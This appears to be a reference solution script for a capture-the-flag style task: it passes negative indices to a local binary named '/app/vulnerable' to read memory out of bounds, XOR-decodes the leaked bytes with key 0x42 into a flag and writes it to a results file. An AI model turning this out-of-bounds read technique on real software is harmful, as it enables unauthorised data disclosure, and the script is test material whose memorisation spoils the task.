#!/bin/bash

python3 -c "
import subprocess

input_data = ''.join(str(i) + '\n' for i in range(-38, 0)) + '-1\n'

proc = subprocess.run(
    ['/app/vulnerable'],
    input=input_data.encode(),
    capture_output=True,
)

encrypted = []
for line in proc.stdout.split(b'\n'):
    if line.startswith(b'> ') and len(line) == 3:
        encrypted.append(line[2])

key = 0x42
flag = ''.join(chr(b ^ key) for b in encrypted).rstrip('\x00')

with open('/app/results.txt', 'w') as f:
    f.write(flag + '\n')
"
